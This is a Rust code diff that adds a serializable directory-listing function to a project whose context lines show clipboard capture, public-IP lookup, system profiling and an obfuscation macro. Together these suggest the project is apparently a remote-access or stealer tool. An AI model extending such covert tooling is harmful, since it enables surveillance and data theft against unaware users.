@@ -1,4 +1,4 @@
-use crate::config;
+use crate::{config, debug_println};
 
 use reqwest::Client;
 use systemstat::{Platform, System};
@@ -9,6 +9,7 @@ use tokio::io::{
     BufReader,
 };
 use std::error::Error;
+use std::time::UNIX_EPOCH;
 use std::{collections::BTreeMap, env, path::PathBuf};
 use tokio::fs::File;
 use goldberg::goldberg_stmts;
@@ -20,6 +21,7 @@ use windows::Win32::System::DataExchange::{OpenClipboard, GetClipboardData, Clos
 use windows::Win32::System::Memory::{GlobalLock, GlobalUnlock};
 use windows::Win32::Foundation::HGLOBAL;
 use std::ffi::CStr;
+use serde::Serialize;
 
 #[inline]
 pub async fn get_real_ip_address() -> std::result::Result<String, Box<dyn Error>> {
@@ -333,4 +335,41 @@ pub fn get_system_information() -> SystemInformation {
     };
 
     return information;
+}
+
+#[derive(Serialize)]
+pub struct FileRecord {
+    name: String,
+    timestamp: i64,
+    #[serde(rename = "isDir")]
+    is_dir: bool,
+}
+
+#[derive(Serialize)]
+pub struct DirectoryContent {
+    #[serde(rename = "currentDir")]
+    current_dir: String,
+    content: Vec<FileRecord>,
+}
+
+#[inline]
+pub fn get_directory_content(path: &Path) -> std::result::Result<DirectoryContent, std::io::Error> {
+    let current_dir = path.to_string_lossy().into_owned();
+    debug_println!("before: {}", current_dir);
+    let mut content = Vec::new();
+
+    for entry in fs::read_dir(path)? {
+        let entry = entry?;
+        let metadata = entry.metadata()?;
+        let name = entry.file_name().to_string_lossy().into_owned();
+        let is_dir = metadata.is_dir();
+        let time = metadata.created().ok().or_else(|| metadata.modified().ok());
+        let timestamp = time.and_then(|t| t.duration_since(UNIX_EPOCH).ok())
+            .map(|d| (d.as_secs() as i64 * 1_000_000_000) + d.subsec_nanos() as i64)
+            .unwrap_or(0);
+
+        content.push(FileRecord { name, timestamp, is_dir });
+    }
+
+    Ok(DirectoryContent { current_dir, content })
 }
